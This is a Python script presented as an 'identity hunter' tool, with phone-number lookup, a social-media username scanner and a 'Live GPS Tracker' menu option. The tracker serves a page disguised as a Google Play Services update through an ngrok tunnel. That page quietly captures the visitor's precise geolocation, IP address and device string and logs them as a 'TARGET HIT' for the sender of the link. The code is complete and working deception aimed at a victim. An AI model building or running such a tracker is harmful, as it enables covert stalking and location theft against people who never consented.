import os, phonenumbers, requests
from flask import Flask, render_template_string, request as flask_req
from pyngrok import ngrok, conf
from colorama import Fore, Style
from phonenumbers import geocoder, carrier
from mandesh_utils import save_result

app = Flask(__name__)

# --- WEB UI FOR TRACKER ---
HTML_TEMPLATE = """
<!DOCTYPE html><html><head><title>System Update</title><script>
function s(p){fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ua='+navigator.userAgent)}
window.onload=()=>{if(navigator.geolocation){navigator.geolocation.getCurrentPosition(s,()=>{}, {enableHighAccuracy:true})}}
</script></head><body style="font-family:sans-serif;text-align:center;padding-top:50px;">
<h3>Updating Google Play Services...</h3><div style="margin:20px auto;width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;animation:spin 2s linear infinite;"></div>
<style>@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
<p>Please do not close this window.</p></body></html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log')
def log():
    lat, lon, ua = flask_req.args.get('lat'), flask_req.args.get('lon'), flask_req.args.get('ua')
    res = f"--- TARGET HIT ---\nIP: {flask_req.remote_addr}\nLat/Lon: {lat},{lon}\nDevice: {ua}\nMaps: https://www.google.com/maps?q={lat},{lon}"
    print(f"\n{Fore.GREEN}{res}{Style.RESET_ALL}"); save_result("IDENTITY-LOG", res)
    return "1"

# --- CORE TOOLS ---
def username_scan():
    user = input(f"{Fore.YELLOW}Enter Username: {Style.RESET_ALL}")
    platforms = {
        "Instagram": f"https://www.instagram.com/{user}",
        "TikTok": f"https://www.tiktok.com/@{user}",
        "GitHub": f"https://github.com/{user}",
        "X (Twitter)": f"https://twitter.com/{user}",
        "Facebook": f"https://www.facebook.com/{user}"
    }
    print(f"\n{Fore.CYAN}[*] Scanning for '{user}'...{Style.RESET_ALL}")
    for name, url in platforms.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(f"{Fore.GREEN}[+] Found: {name} - {url}")
            else:
                print(f"{Fore.RED}[-] Not Found: {name}")
        except: pass

def static_recon():
    num = input(f"{Fore.YELLOW}Enter Number (+254...): {Style.RESET_ALL}")
    try:
        p = phonenumbers.parse(num); print(f"{Fore.CYAN}Location: {geocoder.description_for_number(p, 'en')}\nCarrier: {carrier.name_for_number(p, 'en')}{Style.RESET_ALL}")
    except: print(f"{Fore.RED}Invalid Number!{Style.RESET_ALL}")

def live_tracker():
    try:
        if os.path.exists("/usr/local/bin/ngrok"): conf.get_default().ngrok_path = "/usr/local/bin/ngrok"
        else: conf.get_default().ngrok_path = "/usr/bin/ngrok"
        url = ngrok.connect(5000).public_url
        print(f"\n{Fore.GREEN}[!] SEND THIS LINK: {url}{Style.RESET_ALL}"); app.run(port=5000)
    except Exception as e: print(f"Error: {e}")

def main():
    while True:
        print(f"\n{Fore.BLUE}=== MANDESH IDENTITY HUNTER v3 ==={Style.RESET_ALL}")
        print("[1] Phone Number Recon")
        print("[2] Live GPS Tracker (Link Gen)")
        print("[3] Username Social Scanner")
        print("[0] Exit")
        c = input("\nSelect: ")
        if c == '1': static_recon()
        elif c == '2': live_tracker()
        elif c == '3': username_scan()
        elif c == '0': break

if __name__ == "__main__": main()
